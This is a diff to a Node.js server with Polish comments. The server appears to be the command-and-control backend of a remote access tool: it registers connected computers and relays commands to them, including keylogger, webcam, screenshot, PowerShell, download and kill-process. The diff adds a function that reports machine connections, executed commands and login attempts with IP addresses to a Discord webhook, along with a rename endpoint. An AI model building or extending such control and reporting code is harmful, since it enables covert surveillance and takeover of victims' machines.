@@ -1,5 +1,7 @@
+require('dotenv').config();
 const express = require('express');
 const http = require('http');
+const https = require('https');
 const WebSocket = require('ws');
 const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
@@ -15,9 +17,74 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 const JWT_SECRET = process.env.JWT_SECRET || 'remote-control-secret-key-change-in-production';
+const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
 
 // Inicjalizacja systemu użytkowników
 auth.initializeUsers();
+
+// Funkcja wysyłania logów na Discord
+async function sendDiscordLog(title, status, details = '', fields = []) {
+  if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.trim() === '') {
+    return;
+  }
+
+  const embed = {
+    title: `🖥️ ${title}`,
+    color: status === 'success' ? 0x00ff00 : status === 'error' ? 0xff0000 : 0xffaa00,
+    fields: [
+      {
+        name: '⏰ Czas',
+        value: new Date().toLocaleString('pl-PL'),
+        inline: true
+      },
+      {
+        name: '📊 Status',
+        value: status === 'success' ? '✅ Sukces' : status === 'error' ? '❌ Błąd' : '⚠️ Info',
+        inline: true
+      },
+      ...fields
+    ],
+    timestamp: new Date().toISOString()
+  };
+
+  if (details) {
+    embed.fields.push({
+      name: '📝 Szczegóły',
+      value: details.substring(0, 1024),
+      inline: false
+    });
+  }
+
+  const payload = JSON.stringify({
+    embeds: [embed]
+  });
+
+  const webhookUrl = new URL(DISCORD_WEBHOOK);
+  const protocol = webhookUrl.protocol === 'https:' ? https : http;
+
+  const options = {
+    hostname: webhookUrl.hostname,
+    path: webhookUrl.pathname + webhookUrl.search,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(payload)
+    }
+  };
+
+  return new Promise((resolve) => {
+    const req = protocol.request(options, (res) => {
+      resolve();
+    });
+
+    req.on('error', () => {
+      resolve();
+    });
+
+    req.write(payload);
+    req.end();
+  });
+}
 
 app.use(cors({
   origin: true,
@@ -86,6 +153,18 @@ wss.on('connection', (ws) => {
           
           console.log(`✓ Komputer połączony: ${data.name}`);
           
+          // Log połączenia do Discord
+          sendDiscordLog(
+            '🟢 Nowy komputer w systemie',
+            'success',
+            '',
+            [
+              { name: '💻 Nazwa', value: data.name || 'Unknown', inline: true },
+              { name: '🆔 ID', value: computerId.substring(0, 8), inline: true },
+              { name: '🖥️ System', value: `${data.info?.platform || 'unknown'} ${data.info?.arch || ''}`, inline: true }
+            ]
+          );
+          
           ws.send(JSON.stringify({
             type: 'registered',
             id: computerId
@@ -142,6 +221,33 @@ wss.on('connection', (ws) => {
               params: data.params || {}
             }));
             
+            // Log wykonania komendy do Discord
+            const commandNames = {
+              'screenshot': '📸 Screenshot',
+              'webcam': '📷 Webcam',
+              'keylogger': '⌨️ Keylogger',
+              'powershell': '💻 PowerShell',
+              'download': '📥 Download',
+              'info': 'ℹ️ Info',
+              'shutdown': '🔴 Shutdown',
+              'restart': '🔄 Restart',
+              'lock': '🔒 Lock',
+              'processes': '📊 Procesy',
+              'kill-process': '❌ Kill Process'
+            };
+            
+            sendDiscordLog(
+              `⚡ Wykonano komendę: ${commandNames[data.command] || data.command}`,
+              'info',
+              '',
+              [
+                { name: '👤 Użytkownik', value: ws.username || 'unknown', inline: true },
+                { name: '💻 Komputer', value: targetComputer.name, inline: true },
+                { name: '🆔 ID', value: data.targetId.substring(0, 8), inline: true },
+                { name: '📝 Komenda', value: data.command, inline: false }
+              ]
+            );
+            
             // Potwierdź wysłanie komendy
             ws.send(JSON.stringify({
               type: 'command_sent',
@@ -176,6 +282,18 @@ wss.on('connection', (ws) => {
     if (ws.isComputer && ws.computerId) {
       const computerName = computers.get(ws.computerId)?.name || 'Unknown';
       console.log(`○ Komputer rozłączony: ${computerName}`);
+      
+      // Log rozłączenia do Discord
+      sendDiscordLog(
+        '🔴 Komputer rozłączony',
+        'warning',
+        '',
+        [
+          { name: '💻 Nazwa', value: computerName, inline: true },
+          { name: '🆔 ID', value: ws.computerId.substring(0, 8), inline: true }
+        ]
+      );
+      
       computers.delete(ws.computerId);
       
       // Powiadom klientów webowych
@@ -225,8 +343,29 @@ app.post('/api/auth/login', async (req, res) => {
     const user = await auth.authenticateUser(username, password);
     
     if (!user) {
+      // Log nieudanego logowania
+      sendDiscordLog(
+        '🔐 Nieudane logowanie',
+        'error',
+        `Próba logowania: ${username}`,
+        [
+          { name: '🌐 IP', value: req.ip || 'unknown', inline: true }
+        ]
+      );
       return res.status(401).json({ error: 'Nieprawidłowa nazwa użytkownika lub hasło' });
     }
+    
+    // Log udanego logowania
+    sendDiscordLog(
+      '🔓 Udane logowanie',
+      'success',
+      '',
+      [
+        { name: '👤 Użytkownik', value: username, inline: true },
+        { name: '🎭 Rola', value: user.role, inline: true },
+        { name: '🌐 IP', value: req.ip || 'unknown', inline: true }
+      ]
+    );
     
     // Generuj JWT token
     const token = jwt.sign(
@@ -345,6 +484,44 @@ app.get('/api/computers', authenticateToken, (req, res) => {
   res.json(getComputersList());
 });
 
+app.post('/api/computers/:id/rename', authenticateToken, (req, res) => {
+  const { id } = req.params;
+  const { name } = req.body;
+  
+  if (!name || name.trim() === '') {
+    return res.status(400).json({ error: 'Brak nowej nazwy' });
+  }
+  
+  const computer = computers.get(id);
+  if (!computer) {
+    return res.status(404).json({ error: 'Komputer nie znaleziony' });
+  }
+  
+  const oldName = computer.name;
+  computer.name = name.trim();
+  
+  // Log zmiany nazwy do Discord
+  sendDiscordLog(
+    '✏️ Zmiana nazwy komputera',
+    'info',
+    '',
+    [
+      { name: '👤 Użytkownik', value: req.user.username, inline: true },
+      { name: '🔖 Stara nazwa', value: oldName, inline: true },
+      { name: '🔖 Nowa nazwa', value: name.trim(), inline: true },
+      { name: '🆔 ID', value: id.substring(0, 8), inline: true }
+    ]
+  );
+  
+  // Powiadom klientów webowych o zmianie
+  broadcastToWebClients({
+    type: 'computer_list_update',
+    computers: getComputersList()
+  });
+  
+  res.json({ success: true, name: computer.name });
+});
+
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', computers: computers.size, clients: webClients.size });
 });
@@ -412,4 +589,16 @@ server.listen(PORT, () => {
   console.log(`✓ Serwer uruchomiony pomyślnie`);
   console.log(`✓ System autoryzacji aktywny`);
   console.log(`✓ WebSocket server gotowy`);
+  
+  // Log uruchomienia serwera do Discord
+  sendDiscordLog(
+    '🚀 Serwer uruchomiony',
+    'success',
+    '',
+    [
+      { name: '🌐 Port', value: PORT.toString(), inline: true },
+      { name: '🖥️ Host', value: os.hostname(), inline: true },
+      { name: '⚙️ Node', value: process.version, inline: true }
+    ]
+  );
 });
